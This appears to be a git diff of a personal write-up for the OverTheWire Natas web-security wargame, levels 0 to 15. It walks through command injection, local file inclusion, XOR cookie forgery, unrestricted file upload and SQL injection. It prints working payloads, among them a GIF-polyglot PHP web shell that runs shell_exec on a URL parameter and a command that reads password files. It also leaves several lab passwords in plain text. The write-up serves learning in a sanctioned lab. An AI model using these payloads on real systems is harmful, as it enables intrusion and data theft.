@@ -1,5 +1,11 @@
 # Natas - web security
 
+## Intro
+
+## Useful Resources
+
+* [CyberChef](https://gchq.github.io/CyberChef/)
+
 ## Natas Level 0
 
 ```
@@ -10,11 +16,11 @@ URL:      http://natas0.natas.labs.overthewire.org
 
 Inspect page -> password inside a comment in the body
 
-## Natas Level 0 → Level 1
+## Natas Level 1
 
 ```
 Username:         natas1
-Next Password:    0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq
+Next Password:    0.....q
 URL:              http://natas1.natas.labs.overthewire.org
 ```
 
@@ -22,21 +28,21 @@ URL:              http://natas1.natas.labs.overthewire.org
 Page says right clicking has been blocked - However the block is done in correctly and does not apply to the whole page. Even if it was CTRL + SHIFT + I (Firefox) would bypass this block\
 Once the inspector is open the password can once again be found inside a comment
 
-## Natas Level 1 → Level 2
+## Natas Level 2
 
 ```
 Username:         natas2
-Next Password:    3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
+Next Password:    3.....H
 URL:              http://natas2.natas.labs.overthewire.org
 ```
 
 See requests made for /files/pixel.png accessing /files folder reveals a user.txt with the password for natas3
 
-## Natas Level 2 → Level 3
+## Natas Level 3
 
 ```
 Username:         natas3
-Next Password:    QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
+Next Password:    Q.....Q
 URL:              http://natas3.natas.labs.overthewire.org
 ```
 
@@ -50,11 +56,11 @@ Disallow: /s3cr3t/
 
 Going to /s3cr3t/ revealed another users.txt inside it with the next password
 
-## Natas Level 3 → Level 4
+## Natas Level 4
 
 ```
 Username:         natas4
-Next Password:    0n35PkggAPm2zbEpOU802c0x0Msn1ToK
+Next Password:    0.....K
 URL:              http://natas4.natas.labs.overthewire.org
 ```
 
@@ -72,11 +78,11 @@ Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
 
 > Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
 
-## Natas Level 4 → Level 5
+## Natas Level 5
 
 ```
 Username:         natas5
-Next Password:    0RoJwHdSKWFTYR5WuiAewauSuNaBXned
+Next Password:    0.....d
 URL:              http://natas5.natas.labs.overthewire.org
 ```
 
@@ -89,11 +95,11 @@ Changing this value to **1** and refreshing the page revealed the password.
 
 > Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
 
-## Natas Level 5 → Level 6
+## Natas Level 6
 
 ```
 Username:         natas6
-Next Password:    bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
+Next Password:    b.....S
 URL:              http://natas6.natas.labs.overthewire.org
 ```
 
@@ -120,11 +126,11 @@ Which exposed the secret for the 2nd login
 
 > Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
 
-## Natas Level 6 → Level 7
+## Natas Level 7
 
 ```
 Username:         natas7
-Next Password:    xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
+Next Password:    x.....Q
 URL:              http://natas7.natas.labs.overthewire.org
 ```
 
@@ -148,11 +154,11 @@ Testing for [http://natas7.natas.labs.overthewire.org/index.php?page=/etc/passwd
 Viewing the html file of the page revealed a hint for the correct file to access:\
 [http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas\_webpass/natas8](http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8)
 
-## Natas Level 7 → Level 8
+## Natas Level 8
 
 ```
 Username:         natas8
-Next Password:    ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
+Next Password:    Z.....t
 URL:              http://natas8.natas.labs.overthewire.org
 ```
 
@@ -185,11 +191,11 @@ Output: oubWYf2kBq
 
 Entering this secret into the field revealed the password for the level 9
 
-## Natas Level 8 → Level 9
+## Natas Level 9
 
 ```
 Username:         natas9
-Next Password:    t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
+Next Password:    t.....u
 URL:              http://natas9.natas.labs.overthewire.org
 ```
 
@@ -221,11 +227,11 @@ Using the hint from level 7 I used the following command to get the next passwor
 test; cat /etc/natas_webpass/natas10
 ```
 
-## Natas Level 9 → Level 10 <a href="#natas-level-8-level-9" id="natas-level-8-level-9"></a>
+## Natas Level 10 <a href="#natas-level-8-level-9" id="natas-level-8-level-9"></a>
 
 ```
 Username:         natas10
-Next Password:    UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
+Next Password:    UJ.....k
 URL:              http://natas10.natas.labs.overthewire.org
 ```
 
@@ -257,12 +263,114 @@ The following input revealed the next password
 . /etc/natas_webpass/natas11
 ```
 
-## Natas Level 10 → Level 11 <a href="#natas-level-8-level-9" id="natas-level-8-level-9"></a>
+## Natas Level 11 <a href="#natas-level-8-level-9" id="natas-level-8-level-9"></a>
 
 ```
 Username:         natas11
-Next Password:    
+Next Password:    y.....B
 URL:              http://natas11.natas.labs.overthewire.org
 ```
 
-Now we are show a hint that **Cookies are protected with XOR encryption** and a field to change the background colour.
+Now we are show a hint that **Cookies are protected with XOR encryption** and a field to change the background colour and again a link to view the sourcecode.
+
+The important part in the sourcecode is how the cookie gets set and and how the data is constructed:
+
+```javascript
+$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
+
+function saveData($d) {
+    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
+}
+```
+
+From this we know the plaintext value and can reverse the encoding procedure:\
+\
+Input: data cookie\
+URL Decode -> From Base64 -> XOR {"showpassword":"no","bgcolor":"#ffffff"} (UTF-8)\
+Output: repeating XOR key\
+\
+Having the XOR key we can forge a new cookie with different data\
+\
+Input: {"showpassword":"yes","bgcolor":"#ffffff"}\
+XOR key (UTF-8) -> To Base64 -> URL Encode (all special chars)\
+Output: New cookie with showpassword set to yes\
+\
+After swapping the cookie and reloading the page the password for the next level was shown.
+
+## Natas Level 12 <a href="#natas-level-8-level-9" id="natas-level-8-level-9"></a>
+
+```
+Username:         natas12
+Next Password:    t.....C
+URL:              http://natas12.natas.labs.overthewire.org
+```
+
+Now we see the option to upload 1kB file, supposedly a JPEG, which would be an extremely tiny picture given the file size limit.\
+Checking the source code some sever flaws stick out:\
+\- the folder and more importantly file extension come from a hidden user controlled field on the html\
+\- the file is saved exactly as written in these fields\
+\- only actual limitation is the file size\
+\
+**This likely will be vulnerable to Unrestricted File Upload (potentially leading to Remote Code Execution)**\
+\
+I tested this by selecting a text file with the following content to be uplaoded and changing the hidden fields value to end in .php instead of .jpg.
+
+```php
+<?php echo file_get_contents('/etc/natas_webpass/natas13'); ?>
+```
+
+After uploading the file a link is presented, clicking it displays the password for the next level.\
+Confirming that the server indeed ran the uploaded PHP.
+
+## Natas Level 13 <a href="#natas-level-8-level-9" id="natas-level-8-level-9"></a>
+
+```
+Username:         natas13
+Next Password:    z.....Q
+URL:              http://natas13.natas.labs.overthewire.org
+```
+
+This level looks very similar to the previous one, except now they upgraded!
+
+> For security reasons, we now only accept image files!
+
+The source code looks pretty similar and they are using exif\_imagetype to check the uploaded file.\
+\
+exif\_imagetype only checks first few bytes (magic bytes) of the file to confirm it matches known image formats. It does no further validation of the data.\
+\
+So this type the approach will be practically the same, except turning the PHP into a "polyglot" by setting the magic bytes to match GIF, as this was the easiest to do since these are all within the ASCII range and just need to be typed before the php. I also changed the php, since the previous file was too big with the magic header added.
+
+```php
+GIF87a<?php echo shell_exec($_GET['cmd'].' 2>&1'); ?>
+```
+
+Accessing the link after uploading the file presents us the following error:
+
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+We need to add a value to the cmd parameter. Appending the URL with _?cmd=cat%20/etc/natas\_webpass/natas14_ showed the password for the next level.
+
+## Natas Level 14 <a href="#natas-level-8-level-9" id="natas-level-8-level-9"></a>
+
+```
+Username:         natas14
+Next Password:    SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
+URL:              http://natas14.natas.labs.overthewire.org
+```
+
+Knowing how these levels work this screamed SQL injection. Checking the sourcecode just confirmed this. There are various viable solutions to SQL. My first one was:
+
+**username:"--**\
+**password:"OR 1=1**
+
+Granting me access and showing the password for natas15
+
+## Natas Level 15 <a href="#natas-level-8-level-9" id="natas-level-8-level-9"></a>
+
+```
+Username:         natas15
+Next Password:    
+URL:              http://natas15.natas.labs.overthewire.org
+```
+
+In this level there is no password field. Just a button to check if a user exists and more source code to examine.
